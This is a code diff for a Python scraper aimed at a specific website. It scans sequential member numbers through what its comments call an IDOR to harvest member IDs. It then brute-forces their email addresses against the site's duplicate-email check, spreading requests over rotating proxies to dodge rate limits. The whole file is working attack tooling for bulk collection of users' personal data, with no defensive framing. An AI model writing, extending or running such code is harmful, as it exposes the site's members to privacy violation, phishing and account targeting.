@@ -61,9 +61,6 @@ KEEP_LIVE = int(os.environ.get("KRX_KEEP_LIVE", "16"))
 PICK_N = int(os.environ.get("KRX_PICK_N", "20"))
 HTTP_TIMEOUT = float(os.environ.get("KRX_HTTP_TIMEOUT", "5"))
 CONNECT_TIMEOUT = float(os.environ.get("KRX_CONNECT_TIMEOUT", "3"))
-UNPROVEN_CONNECT = float(os.environ.get("KRX_UNPROVEN_CONNECT", "2"))
-UNPROVEN_READ = float(os.environ.get("KRX_UNPROVEN_READ", "2"))
-DOMAIN_PARALLEL = int(os.environ.get("KRX_DOMAIN_PARALLEL", "3"))
 SESS_CACHE = int(os.environ.get("KRX_SESS_CACHE", "32"))
 MAX_PER_PROXY = int(os.environ.get("KRX_MAX_PER_PROXY", "2"))
 BAD_CAP = int(os.environ.get("KRX_BAD_CAP", "3000"))
@@ -90,24 +87,8 @@ _recent: deque[float] = deque()
 POOL: "ProxyPool | None" = None
 
 
-def is_warm_proxy(proxy: str | None) -> bool:
-    """Proven panda or static home exits reuse TCP; fresh panda does not."""
-    if not proxy or proxy == DIRECT:
-        return False
-    pool = POOL
-    if pool is None:
-        return False
-    if proxy in pool.static_set:
-        return True
-    return proxy in pool.proven
-
-
-def http_timeout(proxy: str | None = None) -> tuple[float, float]:
-    if proxy is None:
-        return (CONNECT_TIMEOUT, HTTP_TIMEOUT)
-    if is_warm_proxy(proxy):
-        return (CONNECT_TIMEOUT, HTTP_TIMEOUT)
-    return (UNPROVEN_CONNECT, UNPROVEN_READ)
+def http_timeout() -> tuple[float, float]:
+    return (CONNECT_TIMEOUT, HTTP_TIMEOUT)
 
 
 def window_rate(now: float | None = None, seconds: float = 30.0) -> float:
@@ -142,62 +123,6 @@ def iter_inflight(ex: ThreadPoolExecutor, items: Iterable[Any], submit: Callable
         done, inflight = wait(inflight, return_when=FIRST_COMPLETED)
         for fut in done:
             yield fut
-
-
-def drain_jobs(
-    ex: ThreadPoolExecutor,
-    items: Iterable[Any],
-    submit: Callable,
-    on_done: Callable[[Any], Iterable[Any] | None],
-    window: int,
-    follow_front: bool = True,
-) -> None:
-    """Keep `window` jobs in flight. Follow-ups from on_done join the queue.
-
-    Follow-ups go to the front so IDOR -> primary mail -> extra is not stuck
-    behind the remaining mbrNo scan.
-    """
-    pending: deque[Any] = deque(items)
-    inflight: set = set()
-    win = max(int(window), 1)
-    while True:
-        while pending and len(inflight) < win:
-            inflight.add(submit(ex, pending.popleft()))
-        if not inflight:
-            return
-        done, inflight = wait(inflight, return_when=FIRST_COMPLETED)
-        for fut in done:
-            try:
-                result = fut.result()
-            except Exception as e:
-                print(f"job_exc {type(e).__name__} {e}", flush=True)
-                continue
-            try:
-                follows = on_done(result)
-            except Exception as e:
-                print(f"on_done_exc {type(e).__name__} {e}", flush=True)
-                continue
-            if not follows:
-                continue
-            seq = list(follows)
-            if follow_front:
-                pending.extendleft(reversed(seq))
-            else:
-                pending.extend(seq)
-
-
-def follow_jobs(result: tuple) -> list[tuple]:
-    """Next jobs after a finished IDOR or mail attempt. Primary miss is not nomail."""
-    kind = result[0]
-    if kind == "idor":
-        _, mno, mid = result
-        if mid:
-            return [("mail", mno, mid, "primary")]
-        return []
-    _, mno, mid, em, phase = result
-    if not em and phase == "primary":
-        return [("mail", mno, mid, "extra")]
-    return []
 
 
 def with_extract_count(url: str, n: int) -> str:
@@ -664,17 +589,13 @@ class ProxyPool:
         if proxy not in self.hold_t:
             self.hold_t[proxy] = time.time()
 
-    def _hung_limit(self, proxy: str) -> float:
-        if proxy == DIRECT or proxy in self.static_set or proxy in self.proven:
-            return CONNECT_TIMEOUT + HTTP_TIMEOUT + 2.0
-        return UNPROVEN_CONNECT + UNPROVEN_READ + 2.0
-
     def _reap_hung(self) -> None:
         now = time.time()
+        lim = CONNECT_TIMEOUT + HTTP_TIMEOUT + 2.0
         hung = [
             p
             for p, n in self.in_flight.items()
-            if n > 0 and now - self.hold_t.get(p, 0) >= self._hung_limit(p)
+            if n > 0 and now - self.hold_t.get(p, 0) >= lim
         ]
         for p in hung:
             self.in_flight.pop(p, None)
@@ -823,28 +744,16 @@ class ProxyPool:
         # Do not fetch here. Scanning threads must not block on extract/probe.
 
 
-def session_for(proxy: str | None, keep_alive: bool | None = None) -> requests.Session:
-    if keep_alive is None:
-        keep_alive = is_warm_proxy(proxy)
-    cache: dict = getattr(_tls, "cache", None) or {}
+def session_for(proxy: str | None) -> requests.Session:
+    cache: dict[str, requests.Session] = getattr(_tls, "cache", None) or {}
     _tls.cache = cache
-    key = (proxy or "direct", keep_alive)
+    key = proxy or "direct"
     s = cache.get(key)
     if s is None:
         s = requests.Session()
         s.trust_env = False
-        headers = {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"}
-        if keep_alive:
-            headers["Connection"] = "keep-alive"
-            pool_n = 8
-        else:
-            headers["Connection"] = "close"
-            pool_n = 4
-        s.headers.update(headers)
-        s.mount(
-            "https://",
-            requests.adapters.HTTPAdapter(pool_connections=pool_n, pool_maxsize=pool_n, max_retries=0),
-        )
+        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest", "Connection": "close"})
+        s.mount("https://", requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0))
         if proxy and proxy != DIRECT:
             s.proxies.update({"http": proxy, "https": proxy})
         cache[key] = s
@@ -855,14 +764,11 @@ def session_for(proxy: str | None, keep_alive: bool | None = None) -> requests.S
     return s
 
 
-def drop_session(proxy: str | None, unstick: bool = False) -> None:
+def drop_session(proxy: str | None) -> None:
     cache = getattr(_tls, "cache", None)
     if cache:
-        base = proxy or "direct"
-        cache.pop((base, True), None)
-        cache.pop((base, False), None)
-        cache.pop(base, None)
-    if unstick and getattr(_tls, "proxy", None) == proxy:
+        cache.pop(proxy or "direct", None)
+    if getattr(_tls, "proxy", None) == proxy:
         _tls.proxy = None
 
 
@@ -883,17 +789,16 @@ def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
                 continue
             _tls.proxy = proxy
         held = proxy
-        warm_before = is_warm_proxy(held)
-        s = session_for(held, keep_alive=warm_before)
+        s = session_for(held)
         try:
             r = s.post(
                 url,
                 data=data,
                 headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
-                timeout=http_timeout(held),
+                timeout=http_timeout(),
             )
             if r.status_code == 407 or is_proxy_auth_fail(text=r.text):
-                drop_session(held, unstick=True)
+                drop_session(held)
                 pool.fail(held, auth=True)
                 proxy = None
                 fails += 1
@@ -901,15 +806,13 @@ def post_ok(url: str, data: dict[str, str], need: str) -> dict[str, Any]:
             body = json_from_response(r)
             if body is not None and need in body:
                 pool.ok(held)
-                if not warm_before and is_warm_proxy(held):
-                    drop_session(held)
                 return body
-            drop_session(held, unstick=True)
+            drop_session(held)
             pool.fail(held)
             proxy = None
             fails += 1
         except Exception as e:
-            drop_session(held, unstick=True)
+            drop_session(held)
             pool.fail(held, auth=is_proxy_auth_fail(e))
             proxy = None
             fails += 1
@@ -933,80 +836,37 @@ def mbr_id(mno: int) -> str | None:
     return block[0].get("MBR_ID")
 
 
-def _dup_hit(body: dict[str, Any] | None) -> bool:
-    if not body:
-        return False
-    val = body.get("isDupMbrEmail")
-    return val is True or str(val).lower() == "true"
-
-
-def _dup_one(mid: str, domain: str) -> str | None:
-    em = f"{mid}@{domain}"
-    body = post_ok(DUP, {"email": em}, "isDupMbrEmail")
-    return em if _dup_hit(body) else None
-
-
 def dup_email(mid: str, domains: list[str]) -> str | None:
-    if not domains:
-        return None
-    hit = _dup_one(mid, domains[0])
-    if hit:
-        return hit
-    rest = domains[1:]
-    if not rest:
-        return None
-    n = max(1, min(DOMAIN_PARALLEL, len(rest)))
-    if n == 1:
-        for d in rest:
-            hit = _dup_one(mid, d)
-            if hit:
-                return hit
-        return None
-    ex = ThreadPoolExecutor(max_workers=n)
-    try:
-        futs = [ex.submit(_dup_one, mid, d) for d in rest]
-        hit = None
-        for fut in as_completed(futs):
-            try:
-                got = fut.result()
-            except Exception:
-                continue
-            if got and hit is None:
-                hit = got
-        return hit
-    finally:
-        ex.shutdown(wait=True)
+    for d in domains:
+        em = f"{mid}@{d}"
+        body = post_ok(DUP, {"email": em}, "isDupMbrEmail")
+        val = body.get("isDupMbrEmail")
+        if val is True or str(val).lower() == "true":
+            return em
+    return None
 
 
-def one_idor(mno: int) -> tuple[int, str | None]:
+def one_idor(mno: int) -> tuple[int, str | None, str | None]:
     while True:
         try:
-            return mno, mbr_id(mno)
+            mid = mbr_id(mno)
+            if not mid:
+                return mno, None, None
+            return mno, mid, dup_email(mid, DOMS_PRIMARY)
         except Exception:
             with _lock:
                 _stats["err"] += 1
             time.sleep(1.5)
 
 
-def one_mail(mno: int, mid: str, phase: str = "extra") -> tuple[int, str, str | None]:
-    domains = DOMS_PRIMARY if phase == "primary" else DOMS_EXTRA
+def one_mail(mno: int, mid: str) -> tuple[int, str | None, str | None]:
     while True:
         try:
-            return mno, mid, dup_email(mid, domains)
+            return mno, mid, dup_email(mid, DOMS_EXTRA)
         except Exception:
             with _lock:
                 _stats["err"] += 1
             time.sleep(1.5)
-
-
-def run_job(job: tuple) -> tuple:
-    kind = job[0]
-    if kind == "idor":
-        mno, mid = one_idor(job[1])
-        return ("idor", mno, mid)
-    _, mno, mid, phase = job
-    mno, mid, em = one_mail(mno, mid, phase)
-    return ("mail", mno, mid, em, phase)
 
 
 def load_csv_map(path: str) -> dict[int, str]:
@@ -1187,9 +1047,7 @@ def acquire_run_lock(outdir: str):
 
 
 def main() -> None:
-    socket.setdefaulttimeout(
-        max(CONNECT_TIMEOUT + HTTP_TIMEOUT, UNPROVEN_CONNECT + UNPROVEN_READ) + 1.0
-    )
+    socket.setdefaulttimeout(CONNECT_TIMEOUT + HTTP_TIMEOUT)
     os.makedirs(OUTDIR, exist_ok=True)
     acquire_run_lock(OUTDIR)
     state_path = os.path.join(OUTDIR, "state.json")
@@ -1254,12 +1112,10 @@ def main() -> None:
 
     mail_jobs, head, tail, holes = build_jobs(START, END, have_id, have_email, scanned)
     idor_jobs = tail + head + holes
-    initial = [("mail", n, mid, "primary") for n, mid in mail_jobs] + [("idor", n) for n in idor_jobs]
-    total = len(initial)
+    total = len(mail_jobs) + len(idor_jobs)
     print(
         f"workers={WORKERS} inflight={INFLIGHT} cap={MAX_PER_PROXY} "
         f"slots~{KEEP_LIVE * MAX_PER_PROXY} timeout={CONNECT_TIMEOUT}/{HTTP_TIMEOUT}s "
-        f"unproven={UNPROVEN_CONNECT}/{UNPROVEN_READ}s dom_par={DOMAIN_PARALLEL} "
         f"panda_probe={int(PANDA_PROBE)} static_strikes={STATIC_STRIKES} "
         f"mail_left={len(mail_jobs)} idor={len(idor_jobs)} "
         f"head={len(head)} tail={len(tail)} holes={len(holes)} "
@@ -1341,27 +1197,15 @@ def main() -> None:
             )
             last_flush = now
 
-    def apply_result(result: tuple) -> list[tuple]:
-        nonlocal total
-        follows = follow_jobs(result)
-        if follows:
-            total += len(follows)
-        kind = result[0]
-        if kind == "idor":
-            _, mno, mid = result
-            handle(mno, mid, None, "idor")
-        else:
-            _, mno, mid, em, phase = result
-            if em:
-                handle(mno, mid, em, "mail")
-            elif phase == "extra":
-                handle(mno, mid, None, "mail")
-            else:
-                handle(mno, mid, None, "mail_primary_miss")
-        return follows
-
     with ThreadPoolExecutor(max_workers=WORKERS) as ex:
-        drain_jobs(ex, initial, lambda e, job: e.submit(run_job, job), apply_result, INFLIGHT)
+        for fut in iter_inflight(ex, idor_jobs, lambda e, n: e.submit(one_idor, n), INFLIGHT):
+            mno, mid, em = fut.result()
+            handle(mno, mid, em, "idor")
+        for fut in iter_inflight(
+            ex, mail_jobs, lambda e, item: e.submit(one_mail, item[0], item[1]), INFLIGHT
+        ):
+            mno, mid, em = fut.result()
+            handle(mno, mid, em, "mail")
 
     ef.close()
     idf.close()
